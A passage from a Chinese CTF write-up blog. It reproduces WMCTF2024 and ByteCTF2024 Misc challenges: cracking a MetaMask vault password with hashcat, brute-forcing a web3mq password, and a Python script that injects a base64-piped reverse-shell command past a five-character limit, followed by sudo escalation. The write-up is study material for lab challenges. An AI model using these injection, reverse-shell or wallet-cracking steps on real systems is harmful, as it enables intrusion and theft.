class="keyword">else</span>:</span><br><span class="line"><span class="comment">#return False, False</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;Unsupported type&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;A parser for the Mozilla variant of Snappy frame format.&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># This Source Code Form is subject to the terms of the Mozilla Public</span></span><br><span class="line"><span class="comment"># License, v. 2.0. If a copy of the MPL was not distributed with this</span></span><br><span class="line"><span class="comment"># file, You can obtain one at http://mozilla.org/MPL/2.0/.</span></span><br><span class="line"><span class="comment"># Credits:</span></span><br><span class="line"><span class="comment">#   – Python source code by Erin Yuki Schlarb, 2024.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> collections.abc <span class="keyword">as</span> cabc</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> typing <span class="keyword">as</span> ty</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cramjam</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress_raw</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="string">&quot;&quot;&quot;Decompress a raw Snappy chunk without any framing&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># Delegate this part to the cramjam library</span></span><br><span class="line"><span class="keyword">return</span> cramjam.snappy.decompress_raw(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Decompressor</span>(io.BufferedIOBase):</span><br><span class="line">inner: io.BufferedIOBase</span><br><span class="line"></span><br><span class="line">_buf: <span class="built_in">bytearray</span></span><br><span class="line">_buf_len: <span class="built_in">int</span></span><br><span class="line">_buf_pos: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, inner: io.BufferedIOBase</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">assert</span> inner.readable()</span><br><span class="line">self.inner = inner</span><br><span class="line">self._buf = <span class="built_in">bytearray</span>(<span class="number">65536</span>)</span><br><span class="line">self._buf_len = <span class="number">0</span></span><br><span class="line">self._buf_pos = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readable</span>(<span class="params">self</span>) -&gt; ty.<span class="type">Literal</span>[<span class="literal">True</span>]:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_read_next_data_chunk</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"><span class="comment"># We start with the buffer empty</span></span><br><span class="line"><span class="keyword">assert</span> self._buf_len == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Keep parsing chunks until something is added to the buffer</span></span><br><span class="line"><span class="keyword">while</span> self._buf_len == <span class="number">0</span>:</span><br><span class="line"><span class="comment"># Read chunk header</span></span><br><span class="line">header = self.inner.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(header) == <span class="number">0</span>:</span><br><span class="line"><span class="comment"># EOF – buffer remains empty</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(header) != <span class="number">4</span>:</span><br><span class="line"><span class="comment"># Just part of a header being present is invalid</span></span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading Snappy chunk header&quot;</span>)</span><br><span class="line"><span class="built_in">type</span>, length = header[<span class="number">0</span>], <span class="built_in">int</span>.from_bytes(header[<span class="number">1</span>:<span class="number">4</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">0xFF</span>:</span><br><span class="line"><span class="comment"># Stream identifier – contents should be checked but otherwise ignored</span></span><br><span class="line"><span class="keyword">if</span> length != <span class="number">6</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid stream identifier (wrong length)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read and verify required content is present</span></span><br><span class="line">content = self.inner.read(length)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(content) != <span class="number">6</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading stream identifier&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content != <span class="string">b&quot;sNaPpY&quot;</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid stream identifier (wrong content)&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">0x00</span>:</span><br><span class="line"><span class="comment"># Compressed data</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Read checksum</span></span><br><span class="line">checksum: <span class="built_in">bytes</span> = self.inner.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(checksum) != <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data checksum&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read compressed data into new buffer</span></span><br><span class="line">compressed: <span class="built_in">bytes</span> = self.inner.read(length - <span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(compressed) != length - <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data contents&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decompress data into inner buffer</span></span><br><span class="line"><span class="comment">#<span class="doctag">XXX:</span> There does not appear to an efficient way to set the length</span></span><br><span class="line"><span class="comment">#     of a bytearray</span></span><br><span class="line">self._buf_len = cramjam.snappy.decompress_raw_into(compressed, self._buf)</span><br><span class="line"></span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span> Verify checksum</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">0x01</span>:</span><br><span class="line"><span class="comment"># Uncompressed data</span></span><br><span class="line"><span class="keyword">if</span> length &gt; <span class="number">65536</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid uncompressed data chunk (length &gt; 65536)&quot;</span>)</span><br><span class="line"></span><br><span class="line">checksum: <span class="built_in">bytes</span> = self.inner.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(checksum) != <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data checksum&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read chunk data into buffer</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">memoryview</span>(self._buf) <span class="keyword">as</span> view:</span><br><span class="line"><span class="keyword">if</span> self.inner.readinto(view[:(length - <span class="number">4</span>)]) != length - <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data contents&quot;</span>)</span><br><span class="line">self._buf_len = length - <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span> Verify checksum</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">type</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x80</span>, <span class="number">0xFE</span> + <span class="number">1</span>):</span><br><span class="line"><span class="comment"># Padding and reserved skippable chunks – just skip the contents</span></span><br><span class="line"><span class="keyword">if</span> self.inner.seekable():</span><br><span class="line">self.inner.seek(length, io.SEEK_CUR)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self.inner.read(length)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unexpected unskippable reserved chunk: 0x<span class="subst">&#123;<span class="built_in">type</span>:02X&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read1</span>(<span class="params">self, size: ty.<span class="type">Optional</span>[<span class="built_in">int</span>] = -<span class="number">1</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="comment"># Read another chunk if the buffer is currently empty</span></span><br><span class="line"><span class="keyword">if</span> self._buf_len &lt; <span class="number">1</span>:</span><br><span class="line">self._read_next_data_chunk()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Return some of the data currently present in the buffer</span></span><br><span class="line">start = self._buf_pos</span><br><span class="line"><span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> size &lt; <span class="number">0</span>:</span><br><span class="line">end = self._buf_len</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">end = <span class="built_in">min</span>(start + size, self._buf_len)</span><br><span class="line"></span><br><span class="line">result: <span class="built_in">bytes</span> = <span class="built_in">bytes</span>(self._buf[start:end])</span><br><span class="line"><span class="keyword">if</span> end &lt; self._buf_len:</span><br><span class="line">self._buf_pos = end</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self._buf_len = <span class="number">0</span></span><br><span class="line">self._buf_pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size: ty.<span class="type">Optional</span>[<span class="built_in">int</span>] = -<span class="number">1</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">buf: <span class="built_in">bytearray</span> = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> size &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(data := self.read1()) &gt; <span class="number">0</span>:</span><br><span class="line">buf += data</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(buf) &lt; size <span class="keyword">and</span> <span class="built_in">len</span>(data := self.read1(size - <span class="built_in">len</span>(buf))) &gt; <span class="number">0</span>:</span><br><span class="line">buf += data</span><br><span class="line"><span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readinto1</span>(<span class="params">self, buf: cabc.<span class="type">Sequence</span>[<span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="comment"># Read another chunk if the buffer is currently empty</span></span><br><span class="line"><span class="keyword">if</span> self._buf_len &lt; <span class="number">1</span>:</span><br><span class="line">self._read_next_data_chunk()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy some of the data currently present in the buffer</span></span><br><span class="line">start = self._buf_pos</span><br><span class="line">end = <span class="built_in">min</span>(start + <span class="built_in">len</span>(buf), self._buf_len)</span><br><span class="line"></span><br><span class="line">buf[<span class="number">0</span>:(end - start)] = self._buf[start:end]</span><br><span class="line"><span class="keyword">if</span> end &lt; self._buf_len:</span><br><span class="line">self._buf_pos = end</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self._buf_len = <span class="number">0</span></span><br><span class="line">self._buf_pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> end - start</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readinto</span>(<span class="params">self, buf: cabc.<span class="type">Sequence</span>[<span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">memoryview</span>(buf) <span class="keyword">as</span> view:</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(buf) <span class="keyword">and</span> (length := self.readinto1(view[pos:])) &gt; <span class="number">0</span>:</span><br><span class="line">pos += length</span><br><span class="line"><span class="keyword">return</span> pos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;492&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> ff:</span><br><span class="line">d = Decompressor(ff)</span><br><span class="line">decoded = d.read()</span><br><span class="line">decodedStr = decoded.decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(decodedStr)</span><br></pre></td></tr></table></figure><p>实际上也可以直接在010里找到我们需要的有关数据</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924160616244.png" alt="image-20240924160616244"></p><p>前面加上{“data”，提取出这一段</p><p>利用hashcat自带的工具metamask2hashcat.py将其转换为hash的形式，kali上这个脚本在&#x2F;usr&#x2F;share&#x2F;hashcat&#x2F;tools&#x2F;的路径下</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924161701427.png" alt="image-20240924161701427"></p><p>由于metamask更新了加密策略，所以要引入额外的<a href="https://github.com/flyinginsect271/MetamaskHashcatModule">模块</a>再用hashcat爆破，字典就是之前得到的password.txt，下载下来的模块放在&#x2F;usr&#x2F;share&#x2F;hashcat&#x2F;modules路径下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 26650 2.txt passwords.txt --force</span><br></pre></td></tr></table></figure><p>得到密码silversi</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924172838415.png" alt="image-20240924172838415"></p><p>然后用metamask官方的<a href="https://metamask.github.io/vault-decryptor/">解密网站</a>得到助记词</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924181017291.png" alt="image-20240924181017291"></p><p>接下来就可以通过助记词进入钱包账户</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924181436001.png" alt="image-20240924181436001"></p><p>翻找之前解压idb文件得到的内容，找到这样的一条进行hex解码</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924201614599.png" alt="image-20240924201614599"></p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924202447303.png" alt="image-20240924202447303"></p><p>这里记录的是一个web3mq的会话，其中的nonce遵循如下格式</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha3_224(`$web3mq$&#123;did_type&#125;:$&#123;did_value&#125;$&#123;keyIndex&#125;$&#123;password&#125;web3mq$`)</span><br></pre></td></tr></table></figure><p>通过类似上述操作，我们可以在其他地方找到如下信息</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">did_type: eth</span><br><span class="line">did_value: 0xd1abc6113bda0269129c0faa2bd0c9c1bb512be6（即钱包地址，这里全小写）</span><br><span class="line">keyIndex: 1</span><br></pre></td></tr></table></figure><p>于是可以写脚本，用之前的passwords.txt作字典爆破得到password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha3_224</span>(<span class="params">string</span>):</span><br><span class="line">        sha3 = hashlib.sha3_224()</span><br><span class="line">        string = <span class="string">&quot;$web3mqeth:0xd1abc6113bda0269129c0faa2bd0c9c1bb512be61&quot;</span>+string+<span class="string">&quot;web3mq$&quot;</span></span><br><span class="line">        sha3.update(string.encode())</span><br><span class="line">        <span class="keyword">return</span> sha3.hexdigest()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bruteforce_sha3_224</span>(<span class="params">target_hash, wordlist</span>):</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> wordlist:</span><br><span class="line">            computed_hash = sha3_224(word)</span><br><span class="line">            <span class="keyword">if</span> computed_hash == target_hash:</span><br><span class="line">                <span class="keyword">return</span> word</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    target_Nonce = <span class="string">&quot;Mzk2ZDBiNTVmZjkyMGRkYTVkNTFjMTQ3ODU4YTM1NDc4ZGE1NjExMTllYmRiYWE4MzQyM2M3YzI=&quot;</span></span><br><span class="line">    target_hash = base64.b64decode(target_Nonce).decode()</span><br><span class="line">    wordlist = <span class="built_in">open</span>(<span class="string">&quot;passwords.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;target_hash: &quot;</span>, target_hash)</span><br><span class="line">    original_string = bruteforce_sha3_224(target_hash, wordlist)</span><br><span class="line">    <span class="keyword">if</span> original_string:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found original string: <span class="subst">&#123;original_string&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No match found in the wordlist.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924203158501.png" alt="image-20240924203158501"></p><p>接下来登录web3mq即可</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924212246005.png" alt="image-20240924212246005"></p><p>由于rpc很不稳定，试了N次以后终于是进去了。。。pull一下最近的聊天记录即可看到flag</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924215222361.png" alt="image-20240924215222361"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> WMCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteCTF2024初赛 部分Misc 复现</title>
      <link href="/posts/fd611e56/"/>
      <url>/posts/fd611e56/</url>
      
        <content type="html"><![CDATA[<blockquote><p>又是一次爆零的比赛。。。还是太菜了，还得多练。</p></blockquote><h3 id="Bash-Game"><a href="#Bash-Game" class="headerlink" title="Bash Game"></a>Bash Game</h3><blockquote><p>比赛的时候本以为这是唯一一道可能做出来的题，赛后看了wp才知道，即使最开始那个字符限制给我侥幸绕过了，后面也是狠狠坐牢。。。</p></blockquote><p>题目主要文件</p><p>main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;ByteCTF/lib/cmd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">&quot;/update&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">result := Update(c)</span><br><span class="line">c.String(<span class="number">200</span>, result)</span><br><span class="line">&#125;)</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Welcome to BashGame&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;:23333&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> OpsPath = <span class="string">&quot;/opt/challenge/ops.sh&quot;</span></span><br><span class="line"><span class="keyword">const</span> CtfPath = <span class="string">&quot;/opt/challenge/ctf.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Update</span><span class="params">(c *gin.Context)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">username := c.PostForm(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">6</span> &#123;</span><br><span class="line">_, err := cmd.Exec(<span class="string">&quot;/bin/bash&quot;</span>, OpsPath, username)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err.Error()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ret, err := cmd.Exec(<span class="string">&quot;/bin/bash&quot;</span>, CtfPath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err.Error()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(ret)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ops.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># -----------params------------</span></span><br><span class="line">name=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">switch_domain</span></span>() &#123;</span><br><span class="line">    conf_file=<span class="string">&quot;/opt/challenge/ctf.sh&quot;</span></span><br><span class="line">    sed -i <span class="string">&quot;s/Bytectf.*!/Bytectf, <span class="variable">$name</span>!/&quot;</span> <span class="string">&quot;<span class="variable">$conf_file</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">switch_domain</span><br></pre></td></tr></table></figure><p>ctf.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> welcome to Bytectf, username!</span><br></pre></td></tr></table></figure><p>题目的逻辑是向&#x2F;update post传参一个name，这个name的值会替换掉ctf.sh中的username，并且ctf.sh会被执行。</p><p>很显然就是要用这个name传入我们要执行的命令，但是题目中对输入的内容长度进行了检测，必须小于6。然而，用来表示内容是命令的反引号已经占掉了两个字符，也就是说得在三字符内构造出我们需要的命令。</p><p>写脚本，每次传一个字符，同时用#注释掉!，最终构成我们的反弹shell的命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">rs = requests.Session()</span><br><span class="line">url_base = <span class="string">&#x27;http://xxx.clsadp.com&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_char</span>(<span class="params">char</span>):</span><br><span class="line">    url = url_base + <span class="string">&quot;/update&quot;</span></span><br><span class="line">    param = <span class="string">&#x27;\\0&#x27;</span>+char+<span class="string">&#x27;/#&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(param)&lt;<span class="number">6</span></span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>: param&#125;</span><br><span class="line">    response = rs.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    command = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    `echo &quot;（这里写自己的反弹shell命令的base64编码）&quot;|base64 -d|bash`</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.strip()</span><br><span class="line">    command = command[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> command:</span><br><span class="line">    add_char(char)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240923002401672.png" alt="image-20240923002401672"></p><p>这里我们是ctf用户，也没法使用sudo，使用sudo -l看看能干什么</p><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240923002541504.png" alt="image-20240923002541504"></p><p>这里是程序进行了检测是否是终端而我们是shell导致的没法使用sudo，获取ptyify将我们转化为伪终端会话。</p><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240923003112221.png" alt="image-20240923003112221"></p><p>在数组的索引中插入命令，利用truegame.sh读取flag</p><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240923003343716.png" alt="image-20240923003343716"></p><h3 id="Guess-Cookie"><a href="#Guess-Cookie" class="headerlink" title="Guess Cookie"></a>Guess Cookie</h3><p>题目要求提交重要通信的cookie的md5值</p><p>流量包中有很多用来混淆的cookie，但是显然这里要找的是erlang cookie</p><p>过滤erldp协议，可以看到很多send challenge的操作</p><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240923235751542.png" alt="image-20240923235751542"></p><p>在github上可以找到有用来爆破erlang cookie的<a href="https://github.com/gteissier/erl-matter">脚本</a></p><p>由于这里不需要远程交互，可以直接从流量包中提取到challenge和digest，因此需要对bruteforce-erldp稍作一下修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 